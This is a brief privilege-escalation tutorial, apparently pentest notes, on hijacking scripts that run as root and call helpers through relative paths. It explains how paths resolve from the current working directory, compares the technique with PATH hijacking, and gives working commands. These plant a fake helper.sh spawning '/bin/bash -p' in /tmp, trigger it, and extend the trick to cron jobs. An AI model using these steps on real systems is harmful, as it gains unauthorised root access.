# Relative Path Exploitation

## Table of Contents

1. [Overview](#overview)
2. [Difference with PATH Hijacking](#difference-with-path-hijacking)
3. [Exploitation](#exploitation)

---

## Overview

When a script references a file or command using a relative path (e.g., `./helper.sh`, `../config.sh`), the path is resolved relative to the **current working directory (CWD)**, not the script's own directory.

For example, if `/opt/app/run.sh` calls `./helper.sh`:
- Running from `/opt/app/` → resolves to `/opt/app/helper.sh` (intended)
- Running from `/tmp/` via `/opt/app/run.sh` → resolves to `/tmp/helper.sh` (hijackable)

By placing a malicious `helper.sh` in the directory we run the script from, we control what gets executed.

## Difference with PATH Hijacking

| | PATH Hijacking | Relative Path Exploitation |
|---|---|---|
| **Target** | Command called by name (`cat`, `ps`) | File called with relative path (`./helper.sh`) |
| **Resolution** | Shell searches `$PATH` directories | Shell resolves from **CWD** |
| **Attack** | Modify `$PATH` to prepend attacker directory | Run the script from a directory containing the malicious file |
| **Example** | `service restart` → hijack `service` | `./helper.sh` → hijack `helper.sh` via CWD |

PATH hijacking exploits the `$PATH` variable. Relative path exploitation exploits the fact that CWD is controlled by the caller.

## Exploitation

### Identify the target

Look for scripts running as root (cron, SUID wrapper, sudo) that use relative paths:

```bash
# Search for relative path references in scripts
grep -rn '\./\|\.\./' /opt/ /usr/local/bin/ /etc/cron* 2>/dev/null
```

### Steps

1. Identify a privileged script using a relative path:

```bash
# Example: /opt/app/run.sh contains
#!/bin/bash
./helper.sh
```

2. Create a malicious file with the same name in a directory you control:

```bash
cat > /tmp/helper.sh << 'EOF'
#!/bin/bash
/bin/bash -p
EOF
chmod +x /tmp/helper.sh
```

3. Run the vulnerable script from your directory:

```bash
cd /tmp
/opt/app/run.sh
```

The script resolves `./helper.sh` to `/tmp/helper.sh` and executes our version.

### Cron job scenario

If a cron job runs a script without setting `cd` to the correct directory first, the CWD depends on the cron configuration (often `/` or the user's home). Check:

```bash
# See if cron sets a working directory
cat /etc/crontab
```

If the cron entry is `* * * * * /opt/app/run.sh` and the CWD is `/`, placing `/helper.sh` (if writable) would hijack it.
